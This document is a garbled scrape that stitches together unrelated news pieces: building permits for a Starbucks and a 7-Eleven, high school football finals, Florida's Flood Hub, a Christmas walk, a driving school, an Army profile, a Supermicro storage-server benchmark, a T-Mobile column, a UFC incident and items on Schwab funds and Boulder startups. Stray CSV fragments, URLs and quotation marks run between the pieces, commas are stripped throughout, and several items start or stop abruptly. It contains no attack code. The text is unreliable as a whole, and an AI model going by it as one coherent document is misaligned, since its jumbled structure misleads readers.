Building Permits

The building permit for the Starbucks drive-through at 3800 S. Western Ave. spells out an initial scope of work to include site preparation landscaping and build-out of a one-story building. An additional permit would cover construction of the restaurant interior.

The building permit for the 7-Eleven gas station and convenience store similarly covers site work and landscaping and construction of the core and shell of the one-story convenience store. An additional permit will allow for build-out of the interior of the store and another for underground gasoline storage tanks.

The site developers from Vequity first presented their plans for the Starbucks and 7-Eleven at a 12th Ward community meeting in October 2020. They also presented revised plans based on community feedback at a January 2021 meeting of the McKinley Park Development Council.

On Dec. 9 user @The3rdWright tweeted a photo of an order from a person named “Blade.” But the drink they purchased was simply a tall cup of water with whipped cream on top.

“Whoever ordered this is fucking INSANE” @The3rdWright wrote.

https://twitter.com/The3rdWright/status/1468829314128826368

Of course this surely wasn’t the first time a Starbucks customer has ordered this unhinged drink. Reddit threads dating back to 2019 confirm that this is a semi-common order—especially among young kids and teenagers.

And if there was a time to get St. Joseph’s Prep this was the year.

The Hawks’ attempt to become the first “large school” team in PIAA history to fourpeat was halted by Mt. Lebanon 35-17 in the PIAA Class 6A state championship on Saturday night at Hersheypark Stadium.

St. Joe’s had an 18-game winning streak dating back to 2019 snapped this season saw their six-year winning streak against Catholic League archrival La Salle come to an end and when doubt surrounded whether or not Prep would make its sixth-straight trip to the state championship the Hawks still managed.

This was considered a bridge season for St. Joe’s (11-3) with a young team in transition. The Hawks ran into a senior-laden District 7 champion Mt. Lebanon that never won a PIAA state title before.

The Blue Devils finished 15-0 and had a trio of determined weapons to stop in pint-sized quarterback Joey Daniels tailback Alex Tezca and wide receiver Eli Heidenreich.

Tezca scored three times — twice rushing once through the air. Hawks’ sophomore quarterback Samaj Jones threw for one touchdown and ran for another but The Prep turned the ball over three times one resulting in a first-quarter 13-yard Heidenreich touchdown run.

“They did everything we practiced against we just didn’t execute the way we can” said Hawks’ sophomore cornerback Omillio Agard who had a clutch interception that helped the Hawks stay in the game. “I’m hurt this hurts bad especially for the seniors. I love these guys. I’m hurt because Keenan (Nelson Hawks’ South Carolina-bound senior defensive back) should have won a state championship his senior year.

“I’m saying this let it burn now because we’re going to be back next year.”

Entering the season the Hawks were 21-1 in the state playoffs. Now they fall to 21-2 with a good portion of their team returning.

Mt. Lebanon scored on three of its first four possessions surging to a 21-7 lead and two of the first three plays they ran.

“It was that first quarter they came out with the momentum and hit us in our weak spots” Hawks’ senior defensive lineman Dan Daly said. “A lot of people doubted us this year because of all of the great Prep teams that came before us. We came out and worked hard if not harder. It didn’t work out the way we wanted it to but we did get here.”

Imhotep Charter fails to close in 17-14 OT loss to Penn-Trafford

On Friday Imhotep Charter lost a late lead then imploded in overtime in losing to Penn-Trafford 17-14 in the PIAA Class 5A state title game.

Imhotep (11-2) was led by sophomore tailback Tre McLeod who pounded Penn-Trafford for a game-high 185 yards rushing on 28 carries and Rahmir Stewart who scored both Panther touchdowns his second came with 7:29 left and seemingly gave Imhotep the game.

No one thought Penn-Trafford (13-2) would get to the state championship — let alone win it. The District 7 3A champion sat at 2-2 in mid-September and somehow found a way to rebound from the 14-7 deficit on Friday night against one of the best defenses in the state.

The Warriors responded to Stewart’s second score with a 12-play 56-yard drive ending with Jack Jollie’s two-yard pass reception of Conlan Greene’s jump pass and Nate Schlessinger’s extra point with :34 left in regulation. The drive was helped by a controversial pass interference call on a fourth-and-10 at the Panthers’ 27. The penalty gave Penn-Trafford a fresh set of downs which the Warriors didn’t squander.

Imhotep blew apart in overtime. The Panthers won the overtime toss and elected to defend. That resulted in Schlessinger’s 24-yard field goal.

That gave the Panthers possession (in high school each team gets the ball at the 10 with four downs to score). First the Panthers were called for a false start which pushed the ball back to the 15.

After a Stewart five-yard run a high snap placed the ball back at the 26. Imhotep a team known for its potent ground game couldn’t move — and the celebration began for Penn-Trafford.

For the most part Imhotep did a good job containing Penn-Trafford’s Wisconsin-bound Cade Yacamelli in the first half holding the 6-foot 205-pound senior to 68 yards rushing but he finished with 100 yards on 21 carries averaging 4.8 yards a carry.

Imhotep ruled the time of possession 39 minutes to 18. The Panthers rushed for 219 yards but they were also penalized 12 times for 81 yards many of those flags coming on third-and-short.

“At the end of the day we had a chance to win and we didn’t execute” Imhotep coach Devon Johnson said. “It’s heartbreaking. But I’m proud of my guys. They fought all year. I told my team to walk off this field with their heads held high.”

The creation of the Florida Flood Hub for Applied Research and Innovation arose from Senate Bill 1954 which the state legislature passed in April. House Speaker Chris Sprowls first announced the priority legislation at a press conference held at USFSP in February. Tom Frazer dean of the College of Marine Science (CMS) said the broad legislative package included over $600 million in funding for various projects focusing on climate and sea-level resiliency.

Frazer said the state channeled the funding through the Department of Environmental Protection and the CMS is working with the agency to establish the Flood Hub. The CMS is responsible for hiring operational staff procuring all the necessary computer hardware and data visualization software and acquiring the infrastructure needed to house the facility.

“It’s a great deal” stated Frazer. “It’s a recognition that the University of South Florida – and the College of Marine Science in particular – has a long history in the coastal resilience arena.

“We have a number of experts who deal very specifically with sea-level rise and other environmental hazards associated with climate change.”

In addition to USF Frazer explained the Flood Hub provides access to expertise across the state’s entire university system. The facility will also take advantage of the existing expertise in the area that surrounds the CMS.

The Florida Fish and Wildlife Research Institute the National Oceanic and Atmospheric Administration’s regional office the U.S. Geological Survey’s Coastal and Marine Science Center and the National Oceanic Institute of Oceanography are all located adjacent to the USFSP and CMS campus.

In conjunction with those state and federal agencies Frazer said the Flood Hub provides an unprecedented amount of scientific information and data to inform vulnerability assessments at the state level.

“Those vulnerability assessments and risk analyses feed into the investments that the state and local government might make moving forward …” he said.

Frazer said the Flood Hub requires a large technical support staff in addition to its director communication specialist and administrative assistants. He said there are a strong need for data acquisition computational modeling and data analytics experts along with those skilled in data visualization.

Frazer said there are even discussions of utilizing St. Pete’s wealth of local artists to create data visualizations that are more attractive and easily understood by the public.

“That’s the core part of the hub as we envision it. Those individuals are providing the support you need for the science groups that are involved.”

Frazer explained the science groups are working groups not employed by the Flood Hub. He said those with recognizable expertise in areas related to the Flood Hub’s mission comprise those groups.

The first working group is designed specifically for the study of sea-level rise and to provide the information needed to update sea level rise projections at a municipal level. Each group will have a scientific lead and the CMS will solicit participants from within and across Florida’s university system.

“The real important point here is to under that there’s a tremendous amount of intellectual capacity out there” said Frazer. “What we’re trying to do is assemble it in a way that we can get the best scientific information available and put it in the hands of our decision-makers at the state level.”

Whether flooding related to sea-level rise storm surge increasing precipitation or stormwater runoff Frazer said the ultimate goal for everyone involved with the new facility is to integrate and model the information they collect.

“What we’re charged with ultimately is developing comprehensive models that will allow us to better plan for and respond to events as they happen in the future.”

Frazer said the CMS and the St. Petersburg Innovation District are in close partnership to bring the facility to fruition. They have identified space in the Innovation District’s new Maritime Defense and Technology Hub to house the Flood Hub upon its opening in January. The long-term home of both the Flood Hub and the CMS will be the USF Interdisciplinary Center for Excellence and Oceanographic Sciences or EOS.

USF President Rhea Law announced the project in November and said the state legislature specifically requested such a facility and thought USFSP would be the perfect location.

Frazer called the EOS project the number one priority for USF regarding capital improvement. Frazer said the university’s Board of Trustees and Board of Governors approved the project and it is also a priority project for state officials.

“It’s a Tier-One project” stated Frazer.

The university is now working with elected officials to secure funding. Frazer noted that the state budget is signed before June 30 2022 and said USF will receive advance notice if the project is within the budget and the level of funding.

“But we’re anticipating funding for that building” said Frazer. “And at that point we will embark upon construction …”

Frazer expects construction on the new facility to take three years and the Flood Hub will call the Maritime Defense and Technology Hub home until its completion.",https://news.google.com/articles/CBMiX2h0dHBzOi8vd3d3LmdlbmVzZW9yZXB1YmxpYy5jb20vc3RvcnkvbmV3cy8yMDIxLzEyLzAxL2dlbmVzZW8tY2hyaXN0bWFzLXdhbGstZGVjLTExLzg4MDIwODYwMDIv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Geneseo Christmas Walk is Dec. 11,"Claudia Loucks

Food and festivities will again highlight the 2021 Geneseo Christmas Walk on Saturday Dec. 11.

The annual Walk is sponsored each year by the Geneseo Chamber of Commerce and Zack Sullivan executive director of the Chamber commented about the 2021 event and said ““All of the Lights” is a theme inspired by 2021 being seen as a comeback year for many events businesses and communities after the COVID-19 related mitigations. COVID-19 turned off the lights on the 2020 event so in 2021 we are turning on all of the lights.”

“The Geneseo Christmas Walk is a kaleidoscope of holiday offerings including live music shopping living windows trolley rides and so much more! This has always been one of my favorite events in Geneseo. People from throughout our region make the annual trip to Geneseo to celebrate Christmas time!”

He continued “The Geneseo Christmas Walk has something for everyone. The Lighted Parade is a regional attraction while the new Central Bank Pavilion of Lights will provide the perfect holiday backdrop of illumination – featuring a walk-through Christmas light display. The Geneseo Chamber works to balance the best of our traditional elements with new features and I think the 2021 Geneseo Christmas Walk really hits that mark.”

Clairsville gets a new look,"ST. CLAIRSVILLE — You may find the sign with the funny child-like name seem cute but it’s all serious when it comes to driving.

The Beep Beep Driving School located at 252 W. Main Street in St. Clairsville provides a thorough state-mandated driver education course owned and operated by Shawn and Julie Powell.

BBDS was born from and heavily influenced by former law enforcement personnel such as Julie’s father Mike Nelson and husband Shawn as well as former owner Bob West who decided to stay on as a driving instructor after selling the business to the Powell’s this past January.

“The whole concept of the school is run by cops” Julie said adding that after Shawn who is also a veteran left the force to work in the coal mines missed being a patrolman and began interacting with kids with one being good driving skills.

Julie said they wish to be a part of a foundation that helps prevent the type of accidents that can be avoided.

And as for the instructors Julie feels she has the best staff of instructors a business could have.

“All our drivers are amazing” she said of the group which consists of West Rita Foder a former youth leader Allan Rutter who makes the drive from Moundsville each day Harry Wright a former police officer and Jim Weisgerber who Julie calls a jack-of-all trades.

“I don’t know if I can say enough about our employees” she said in glowing terms. Her father Mike is also a former officer with the Ohio Highway State Patrol for 26 years and now instructor for 11 years. Another instructor she is proud of is the Mayor of Brookside Rich Kurner – a state licensed instructor by the Ohio Department of Public Safety as all their drivers/instructors are.

The young students when under the age of 18 must complete a total of 32 hours of driver education broken down to a 24-hour online course and the remaining eight hours of actual driving. Also included is an additional 50 hours of driving experience with a parent or guardian as well – 10 of those hours must be conducted at night.

The award winning school – first place two consecutive years for Best of Ohio Valley Readers Choice – provides a service for youth from all around the area including West Virginia which does not have the state requirements that Ohio does according to Julie. But she said they will still come to the school some 18 and older because the parents either don’t have the time to help their child to become a better driver or they’re just plain worried and want more driver’s education for them.

“We have lots of West Virginia kids” she said. And one thing she’s learned close up are the nuts and bolts of the operation after BBDS’s longtime secretary Terri Conaway retired and Julie had to take over those duties.

“She was a sweetheart” she said of Conaway. There are plenty of helpful links on their official website (beepdriversed.com) and instructions and costs for programs. The number to reach them is: 740-699-0333.

“We’re really blessed to have such amazing people that work here” Julie explained."

Lexie Etheridge a human resources specialist assigned to 4th Battalion 9th Infantry Regiment 1st Stryker Brigade Combat Team 4th Infantry Division the path of serving others was one she had wanted to follow from a young age.



Having her first child at the age of 18 Etheridge soon realized the path she was destined to travel wouldn’t be walked alone but the reward at the end would be worth every step along the way.



“I’m somewhat sort of an anomaly where I’m from” said Etheridge gleefully with a thick southern accent. “It’s rare that you see women back in my hometown volunteering to join the Army let alone a single mother with two kids.”



The Union City Tennessee native knows she’s always had a passion for helping others which she claims stems from her supportive family and upbringing.



“Southern hospitality is certainly a real thing not just an expression” said Etheridge jokingly. “I owe a lot to my parents and how they raised me. They instilled in me at a very young age an empathetic and caring nature that I carry with me and try to do the same with my children.”



With ambitions to pursue a career in nursing Etheridge was in a vocational student organization for her duration of high school called the



Health Occupation Students of America (HOSA). HOSA’s mission is to train and educate future healthcare professionals to become leaders in the global health community.



“It was a very empowering experience” Etheridge said. “I was taught a lot of tools and skills both related and unrelated to healthcare that I still use to this day. I will always be grateful for the experience.”



Although equipped with the competencies to begin a profession of helping others Etheridge’s pregnancy put her future potential career in the healthcare sector on hold.



“My number one priority became my son at the time” said Etheridge. “I was young and so heavily invested in trying to be the best mother that I practically disregarded anything related to professional development.”



Despite doing various volunteer work in her community Etheridge felt an overwhelming sense of stagnation.



She says it was her two children five-year-old Levi and three-year-old Lilah who kept her grounded and motivated to find ways to push herself and others.



“It wasn’t easy being a mother at 18 but I never needed or asked for sympathy” she said. “I understood the position I was in so instead of vicariously living through all of my friends’ young adult lives my main focus was to raise my children help them grow and help myself grow in the process.”



Etheridge says as beneficial as the growth process was it came with its own set of trials and tribulations.



“I was a stay-at-home mother for almost four years before I volunteered to join” she said. “There was this empty void I couldn’t seem to fill. Don’t get me wrong nothing brings me more joy and fulfillment than raising my children but I was still missing something. Something intangible.”



After picking up a waitressing job for a year Etheridge says her patience grew thin and the monotony of her life was making her lose track of who she was and what she was set out to accomplish.



“I was done limiting myself to the confines of this restaurant and hometown” Etheridge said. “I knew I wanted to help change lives and leave an impact. It was time for me to become a better role-model for my children. The Army offered me opportunities no other organization could and I went after it. I knew I could bake all day and still be a great role-model but there is a level of sacrifice that is incomparable to Soldiers’ willingness to risk their lives for the safety and protection of their nation



and its citizens.”

Those who’ve met Etheridge during her two years in the Army thus far can best describe her as a motherly addition to their unit.



“We used to call her ‘Momma E’” said Staff Sgt. Malik Carter a human resources specialist assigned to Headquarters and Headquarters Company 1st SBCT 4th Inf. Div.. “Cpl. Etheridge epitomizes our military occupational specialty. Her natural inclination to help others in our shop was a direct translation of who she is as a person. She goes above and beyond the expectations set out for her and continues to strive for more.”



She has already twice accomplished the “Manchu Mile” hosted by the 4th Bn. 9th Inf. Reg.



Soldiers carry a 35-pound ruck and their rifle while completing a 25-mile commemorative march honoring Soldiers who fought the Chinese Boxer Rebellion by marching over 85 miles to the Battle of Tientsin in 1900.



“Take it from me they don’t get any easier” said a laughing Etheridge. “Enduring all 25 miles with your teammates and motivating one another is the deciding factor in successfully completing the march. Between the camaraderie combined with the history behind the event you naturally find the strength to finish it.”



Etheridge also graduated from the Basic Leaders Course 7th in her class out of a total of 242 Soldiers setting the bar high for her peers and subordinates.



“The sky’s the limit for me now” said Etheridge. “I’m fortunate enough to have given myself the opportunities when I did to be where I am today. I’m eager to continue my journey on helping others because that’s just who I am as a person.”



Now assigned to Task Force Manchu 1st SBCT at Erbil Air Base Iraq Etheridge says she has no plans of slowing down.



“I wonder about my journey and how much I’ve grown” said Etheridge. “I begin to think of the reward waiting at my destination for all the hard work I’ve put in but I know I’m far from it. The reward may lead to another path and that may very well lead to another person in need making this journey a never-ending reward in itself.”

We like talking about flash because well it’s fast and makes applications smile thanks to low latency. But the reality is hard drives still dominate the storage landscape whether you’re a hyperscaler or a small business — our readers certainly don’t need the hyperbolic rant about the speed of data growth. To help address these rapidly growing data needs be it backup media files or unstructured data Supermicro has many solutions.

Supermicro Storage SuperServer SSG-540P-E1CTR36H

Supermicro offers a wide variety of storage servers in additional to pure JBODs that are similar looking. Of course the top of the line are NVMe servers. There’s also a line of destiny-optimized offerings in the top-loading storage server family. These are more designed for hyperscalers and other use cases where terabytes per rack U is the primary requirement. For the rest of the world Supermicro offers what it calls enterprise-optimized storage servers. This family covers your commonly found 1U-4U options with externally accessed drive bays.

In the case of this review the SSG-540P-E1CTR36H is a double-sided version of the SuperServer. It’s 4U and supports a total of 36 3.5″ drive bays for storage. There are 24 in the front and another 12 in the rear. Onboard SATA (6Gbps) is supported via the C621A Chipset which offers RAID 0 1 5 and 10 support. SAS connectivity for the 3.5″ bays (12Gbps) is handled via a Broadcom 3908 with RAID 0 1 5 6 10 50 and 60 support. It should be noted that there is another flavor of this server the SSG-540P-E1CTR36L. The “L” model differs just in the SAS card opting for the Broadcom 3808 (IT mode) instead. Either version can be equipped with two hot-swap 2.5″ NVMe/SATA bays on the rear.

Internally the Supermicro Storage SuperServer includes a single NVMe/SATA M.2 bay for boot. Should you prefer there are also two SuperDOM (Disk on Module) ports with built-in power on the board. For those looking to be more adventurous with the internal storage there is support for two internal fixed bay modules with support for up to 4x 2.5″ drives in total.

This system is a single-socket server supporting Intel Ice Lake CPUs up to 270W TDP. The board also offers eight DDR4-3200 DIMM slots that do support Intel PMem though that would be overkill for most in this particular system. The underlying motherboard is the Supermicro Super X12SPI-TF.

Looking at expansion Supermicro includes two PCI-E 4.0 x16 (LP) slots and two PCI-E 4.0 x8 (LP) slots. This gives the end-user quite a bit of flexibility via add-in cards. Supermicro has equipped the server with twin Intel Ethernet Controller X550 10GbE RJ45 NICs. There’s also a GbE port for IPMI server management. Visible in the above photo and on the rear-view of the chassis is an add-on card for JBOD expansion which ties in directly to the SAS expander on this server. This allows for easy and affordable expansion of the storage pool on the server since it ties in directly to the primary RAID card.

Supermicro Storage SuperServer Configuration

For this review we secured 32 Western Digital Ultrastar DC HC520 12TB hard drives. 32 may seem an odd amount for a 36-bay storage server. Either I asked for four short of our count or WD said we could only have 32. Either way we’re still very well stocked on storage the 12TB drives give us 384TB of raw storage with four drive bays for expansion or hot spares.

If we were going for a density hero number of course WD’s 20TB HDDs would be preferable. But the reality is that in the enterprise and certainly with most SMBs that have a large data footprint economics enters the conversation sooner than later. The 12TB HC520 can be found for under $400 in retail and that’s not even a volume price. The drives are still in production and have been one of WD’s strongest workhorse HDDs in this capacity point. Our review units have a November 2021 build date.

For its part the HC520 is available in either a SAS or SATA part with capacities ranging up to 12TB. The drives are helium sealed and feature a 7200 RPM spindle speed. Each drive is rated to deliver a maximum of 255MB/s meaning our Supermicro Storage SuperServer with 32 drives can deliver a best-case 8000MB/s which will easily saturate its twin 10GbE ports in some workloads. The full WD HC520 spec sheet can be found here.

With the capacity storage sorted we installed a Supermicro SATADOM for boot duties. While many will prefer the M.2 option for boot the and user has options. To help us aggregate the storage and share it out to the network we installed TrueNAS CORE. With the specifications available even in this single-socket configuration the argument could be made that internal benchmarks would be appropriate. We simply opted to leverage shared storage via TrueNAS for this review.

Supermicro Storage SuperServer Performance

To show just how easy it is to get this platform rolling we deployed TrueNAS CORE on this Supermicro Storage SuperServer leveraging the onboard Intel dual-port 10GbE interface for connectivity. Leveraging the 32-supplied WD HDDs we opted for RAIDZ3 giving us protection from three drive failures.

Using the default filesystem configuration we had LZ4 compression enabled with deduplication turned off. We then created four shared folders for testing SMB performance and four 25GB iSCSI LUNs for block storage performance.

Enterprise Synthetic Workload Analysis

Our enterprise hard drive benchmark process preconditions each drive-set into steady-state with the same workload the device will be tested with under a heavy load of 16 threads with an outstanding queue of 16 per thread. The device is then tested in set intervals in multiple thread/queue depth profiles to show performance under light and heavy usage. Since hard drives reach their rated performance level very quickly we only graph out the main sections of each test.

Preconditioning and Primary Steady-State Tests:

Throughput (Read+Write IOPS Aggregate)

Average Latency (Read+Write Latency Averaged Together)

Max Latency (Peak Read or Write Latency)

Latency Standard Deviation (Read+Write Standard Deviation Averaged Together)

Our Enterprise Synthetic Workload Analysis includes four profiles based on real-world tasks. These profiles have been developed to make it easier to compare to our past benchmarks as well as widely-published values such as max 4K read and write speed and 8K 70/30 which is commonly used for enterprise drives.

4K 100% Read or 100% Write 100% 4K

8K 70/30 70% Read 30% Write 100% 8K

128K (Sequential) 100% Read or 100% Write 100% 128K



Looking at our throughput test which measures 4K random performance the Supermicro SuperServer (populated with WD HC520 12TB HDDs) showed iSCSI performance of 309184 IOPS read and 15560 IOPS write. In SMB the Supermicro SuperServer hit 107507 IOPS read and 15228 IOPS write.

Next is 4K average latency. Here the Supermicro SuperServer hit 16.45ms latencies of write and 0.83ms read in the iSCSI configuration while SMB recorded 16.81ms write and 2.38ms read.

With 4K max latency the Supermicro SuperServer showed 28810ms read and 171.4ms write in iSCSI while hitting 118.1ms read and 94ms write in SMB.

In standard deviation the Supermicro SuperServer showed reads and writes of 18.77ms and 13.68 ms in iSCSI respectively while SMB showed 1.82ms read and 10.67ms write in SMB.

The next benchmark tests the drives under 100% read/write activity but this time at 8K sequential throughput. In iSCSI the Supermicro SuperServer hit 252407 IOPS read and 280627 IOPS write while SMB saw 108928 IOPS read and 102941 IOPS write.

Our next test shifts focus from a pure 8K sequential 100% read/write scenario to a mixed 8K 70/30 workload which will demonstrate how performance scales in a setting from 2T/2Q up to 16T/16Q. In SMB the Supermicro SuperServer started at 16538 IOPS and ended at 42407 IOPS in the terminal queue depths. In iSCSI we saw a range of 16971 IOPS to 53071 IOPS.

With average latency at 8K 70/30 the Supermicro SuperServer showed a range of 0.23ms through 4.82ms in iSCSI while SMB showed a range of 0.23ms through 6.03ms.

For max latency the Supermicro SuperServer posted a range of 12.67ms to 244.42ms in iSCSI while SMB showed 10.03ms through 42.1ms in the terminal queue depths.

The standard deviation latency results the Supermicro SuperServer had a range of 0.08ms to 3.86ms in iSCSI while SMB recorded 0.07ms through 1.84ms.

Our last test is the 128K benchmark which is a large-block sequential test that shows the highest sequential transfer speed. Here the Supermicro SuperServer posted 2.32GB/s read and 2.31GB/s write in iSCSI while SMB had 2.31GB/s read and 2.31GB/s write.

Conclusion

The Supermicro Storage SuperServer is a 36-bay mainstream storage server powered by Intel’s latest 3rd Gen Scalable CPU and is a great solution to help organizations with their rapidly growing data needs such as backup media files or unstructured data.

For performance we tested the Supermicro SuperServer using both iSCSI and SMB connectivity populating the server with the 32 Western Digital Ultrastar DC HC520 12TB hard drives. We installed TrueNAS CORE to share the storage over the network the drives in RAIDZ3 for resiliency. We used the native twin Intel 10GbE ports on the Supermicro box.

With our FIO workloads measuring RAID3Z performance across 32 HDDs the Supermicro SuperServer showed 4K random performance of 309184 IOPS read and 15560 IOPS write in iSCSI while hitting 107507 IOPS read and 15228 IOPS write in SMB. Looking at workloads under 100% read/write activity 8K sequential throughput the Supermicro SuperServer hit 252407 IOPS read and 280627 IOPS write (iSCSI) and 108928 IOPS read and 102941 IOPS write (SMB). In our mixed 8K 70/30 workload which will demonstrate how performance scales in a setting from 2T/2Q up to 16T/16Q the SuperServer started at 16538 IOPS and ended at 42407 IOPS in the terminal queue depths in SMB while seeing a range of 16971 IOPS to 53071 IOPS in iSCSI.

Finally in our large-block sequential 128K benchmark the Supermicro SuperServer posted 2.32GB/s read and 2.31GB/s write in iSCSI and 2.31GB/s read and 2.31GB/s write in SMB. At this point we were saturating both onboard 10GbE NICs showing that this server has much more to give. If your use case is dependent on large block sequential workloads it may be worth investing in a faster add-in card. This server has plenty of room for expansion.

Storage servers of this nature have been fundamental to supporting a wide range of use cases over the years supporting the explosion of data in the enterprise. Supermicro has done well with this server offering a progressive update thanks to the new 3rd Gen Intel Scalable CPU. Even though this rig is designed for optimized capacity Supermicro does offer support for 2.5″ NVMe bays in the back and the board supports Intel PMem in the event you need this thing to really scream. For everyone else this particular combo of Supermicro gear affordable 12TB WD hard drives and TrueNAS CORE layered on top will be more than enough.

Now I'm not so sure,"Losing its touch? Image: T-Mobile ZDNet

Perhaps I've been lucky.

Every time I've visited a T-Mobile store I've encountered customer service markedly superior to that of say AT&T.

Not so many months ago I visited both an AT&T and T-Mobile store and discovered opposed attitudes toward me as a customer.

Then again I'm not a T-Mobile customer. I've been with AT&T longer than is healthy. Perhaps new faces are more of an attraction than existing customers.

Perhaps too T-Mobile is now struggling to maintain its image as well a little more human than the others.

Bloomberg you see offered a slightly grim picture of several factors -- internal and external -- that have at least in some customers' eyes rendered T-Mobile's customer service as marginally infernal.

First the company merged with Sprint. Some might observe that any carrier merging with Sprint might have ended up tainted with a diminished image.

Yet this coincided with the departure of -- oh what's the word? -- flamboyant ra-ra-ish imaginatively coiffed CEO John Legere.

He emphasized a proactive attitude toward customers. He exemplified it with his populist Twitter persona. He departed some might suspect just when he knew things couldn't get better and would likely get worse.

And then came the pandemic. Few companies have managed to garland themselves with additional humanity in an atmosphere where many employees worked from home and then quit altogether.

But there seems now to be firm evidence that all is not well at Magenta Mansions.

Perhaps the starkest data comes from the American Customer Satisfaction Index. It shows T-Mobile's rating slipping a fearsome 5% from 2020 to 2021.

You might think this is nothing. Or inevitable during a pandemic. But what if I told you that Verizon's rating stayed the same while gasp AT&T's actually rose by a point? Indeed only US Cellular languished below T-Mobile in the mobile network operator category.

It's hard then to digest the words of T-Mobile CEO Mike Sievert: ""We are delivering the best service in this industry by any objective measure.""

Is he suggesting that the ACSI is somehow less than objective? And yes he did add words like ""thriving"" and ""growing.""

It's easy to drift to Twitter comments and wonder how bad things might be. Or not. What's harder is merging with a deficient brand for the glory of money and power and not being an upstart anymore.

T-Mobile traded on something it can no longer be. Indeed Apple was once an upstart but had to trade in that image for a more global corporate and frankly blander persona.

Simultaneously however Apple also expanded its customer service capabilities and understood -- sometimes very slowly -- that as it grew it had to respond to customer complaints ever more quickly and a lot more sensitively.

That path may still be open to T-Mobile. It may be an easier path once the pandemic truly eases. It will have to be a path however that is led from the top and shows some new imagination.

Ultimately this isn't a fine situation for customers. It's akin to the airline business where four US airlines own more than 80% of all seats. The incentive to emphasize truly different customer service isn't as strong as it is for the likes of upstarts like JetBlue.

In the carrier business there are truly only three big brands. Each no doubt looks forward to more transactions occurring online and less customer-to-human interaction thanks to the glories of AI.

Currently I sense that there's enormous dissatisfaction among the customer service personnel of all the big carriers.

Staff from all three big brands tell me of understaffing customers who are exponentially more offensive and unseemly pressures to sell items that customers simply don't need or want.

An optimist might see the current moment as a great branding opportunity for T-Mobile. Pessimists may worry that all three carriers will merely become the same.

I don't see an un-carrier on the horizon. Do you?

A video captured cageside at the T-Mobile in the immediate aftermath of Pena’s win showed a stunned front row of fighters with Chiesa hopping the guard rail.

UFC president Dana White shed some light on why a bloodied Michael Chiesa was dragged away by police after Saturday night’s co-main event at the T-Mobile.

“No no no – he did not get in a fight” White explained at the post-event press conference in Las Vegas when asked about the incident.

“Let me say this without embarrassing this guy: he had a little bit too much to drink this evening and when [Pena] won he freaked out and tried to jump into the Octagon and fell down on his face caught his eye and busted his eye open.

“Then he was arguing with the police that he needed to get into the Octagon to be with her because that’s his teammate.

“They dragged him outside calmed him down in the back. I went back and talked to him for a minute and we’re all good.”

Pena 32 and Chiesa have trained out of the SikJitsu gym in Spokane Washington together for 13 years and the new bantamweight champ also gave her reaction to the incident.

“Yes Mike and me started within one week of each other in the gym” she told media.

“We’ve been grinding in Spokane since we were babes. I was 19. It was a big moment for me a big moment for him I know he was very emotional.

“I can’t speak on anything else that happened. I was uber focused on what I needed to do. But I know he loves me and this win was just as big for him as it was for me.”"

Thus our best Charles Schwab funds for 2022 have been selected for investors of all stripes whether they want to build a complete portfolio or simply fill a niche with a targeted product.

Just as we mentioned in outlining our 22 best stocks for 2022 the theme for the new year is ""anything can happen."" COVID burned most 2020 playbooks to the ground and rampant inflation took most investors by surprise in 2021. The sudden post-Thanksgiving COVID omicron scare threatened to upend things heading into 2022 – and while the variant might end up being less damaging than feared new COVID strains could cause turbulence in the coming year.

Investors have other factors to consider too. If inflation remains high in the short term but normalizes in 2022 the Fed's ""transitory"" narrative will hold and the market should rejoice. But if hyperinflation remains or worsens investors could react negatively. Same with interest rates. If there's no surprise (such as a rate hike sooner than expected) the market should continue to remain positive assuming corporate earnings and other fundamentals hold up.

One final concern for investors is valuation. Stock prices – especially in certain pockets such as large-cap tech – are quite elevated. Will they finally come back to earth in 2022 as some pundits have predicted or will momentum keep them aloft?

With these themes to consider we present our 10 best Schwab funds for 2022. This group of mutual funds and exchange-traded funds (ETFs) offers ways to participate in additional upside in stocks as well as ways to protect against potential 2022 headwinds. Also where applicable we note when Schwab offers comparable mutual funds and ETFs for the same theme.",https://news.google.com/articles/CBMiW2h0dHBzOi8vd3d3LmRhaWx5Y2FtZXJhLmNvbS8yMDIxLzEyLzEyL3VuaWNvcm5zLWJvdWxkZXItY291bnR5LXN0YXJ0dXBzLWJpbGxpb24tdmFsdWF0aW9ucy_SAV9odHRwczovL3d3dy5kYWlseWNhbWVyYS5jb20vMjAyMS8xMi8xMi91bmljb3Jucy1ib3VsZGVyLWNvdW50eS1zdGFydHVwcy1iaWxsaW9uLXZhbHVhdGlvbnMvYW1wLw?hl=en-US&gl=US&ceid=US%3Aen,The unicorns: Timing key for Boulder County startups that achieved $1B valuations,"In business lingo a unicorn is that rare privately held startup that has achieved a valuation exceeding $1 billion.

Recently nearly a half dozen companies in the Boulder Valley have reached that lofty status following in the footsteps of older companies that previously reached that valuation mark after starting here such as Level 3 Inc. StorageTek Inc. and the Zayo Group.

A trio of Louisville-based companies JumpCloud Inc. Sovos Brands Holdings Inc. and Solid Power Inc.; and two based in Boulder SomaLogic Inc. and Uplight Inc. are considered the newest unicorns in the venture-capital world.

The term “unicorn” was coined in 2013 by venture capitalist Aileen Lee founder of Cowboy Ventures a seed-stage venture-capital fund in Palo Alto Calif. According to Investopedia there are only 800 unicorns in the world.

Venture capitalists determine the value of a business by analyzing its management team the composition of its capital structure the prospect of future earnings and the market value of its assets among other metrics.

There are various strategies used to achieve this high valuation: acquiring companies; being acquired or a combination of both; mergers or sheer persistence. But a common thread among the region’s newest unicorns has been their ability to raise venture capital to enable growth.

SomaLogic Inc.

SomaLogic is a protein biomarker discovery and clinical diagnostics company headquartered in Boulder. It took almost two decades of innovative research and investment to reach unicorn status but today SomaLogic operates the SomaScan Platform a new technology that makes protein measurement as straightforward as DNA measurement.

Founded in 2000 by University of Colorado Boulder professor Larry Gold SomaLogic has a valuation north of $2 billion after an initial public offering in September.

Gold recently removed himself from SomaLogic’s board of directors and is heavily involved in the company’s research and development group. SomaLogic has approximately 200 employees worldwide.

The company’s SomaScan Platform can uncover a deeper understanding of the real-time molecular bases of health and disease than is possible through genomic or other protein technologies.

Roy Smythe SomaLogic’s CEO since November 2018 calls SomaLogic “a 21-year-old overnight success story.” Smythe said it took 15 years to develop the SomaScan Platform.

Although the first draft of the human genome was also announced in 2000 SomaLogic embarked on a different path than everyone else focusing instead on the much-harder challenge of measuring changes in the body’s proteins in relation to disease and health. The result of taking that tack is that SomaLogic’s tests provide information that can lead to precise diagnoses by doctors.

